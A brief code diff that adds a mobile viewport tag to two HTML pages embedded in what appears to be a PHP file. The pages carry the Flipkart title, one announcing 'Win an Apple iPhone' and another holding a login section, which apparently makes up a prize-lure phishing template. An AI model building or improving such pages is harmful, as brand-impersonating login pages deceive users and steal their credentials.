@@ -19,6 +19,7 @@ return <<<l
 <!Doctype html>
 <head>
 <title>Flipkart</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
     <h2>Win an Apple iPhone</h2>
@@ -43,6 +44,7 @@ return <<<l
 <!Doctype html>
 <head>
 <title>Flipkart</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
     <div class="login">
